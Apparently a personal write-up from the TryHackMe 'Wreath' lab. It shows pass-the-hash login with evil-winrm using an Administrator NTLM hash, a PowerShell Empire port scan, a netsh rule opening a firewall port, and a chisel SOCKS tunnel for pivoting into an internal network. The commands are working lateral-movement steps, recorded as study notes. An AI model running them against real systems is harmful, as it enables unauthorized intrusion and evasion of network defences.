Using Evil-winrm we can pass the scripts folder  and call a particular script afterwards

`evil-winrm -u Administrator  -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.89.150 -s /usr/share/powershell-empire/data/module_source/situational_awareness/network/`

loading the script
`Invoke-Portscan.ps1`

using the script
`Invoke-Portscan -Hosts 10.200.89.100 -TopPorts 50`

output:
`Hostname      : 10.200.89.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 79, 88...}
finishTime    : 4/30/2021 4:07:54 PM
`
![[Screenshot 2021-04-30 at 8.46.55 PM.png]]


opening the port in the git server using netsh

`netsh advfirewall firewall add rule name="Chisel-sp00f" dir=in action=allow protocol=tcp localport=20000`

upload the chisel binary and run it from the port opened above 
`upload /home/sp00f/THM/Wreath/10.200.109.100/www/chisel-sp00f.exe`
`.\chisel-sp00f.exe server -p 20000 --socks5`
![[Screenshot 2021-04-30 at 9.07.10 PM.png]]

listen on the port locally
`chisel client 10.200.89.150:20000 7070:socks`
![[Screenshot 2021-04-30 at 9.37.24 PM.png]]

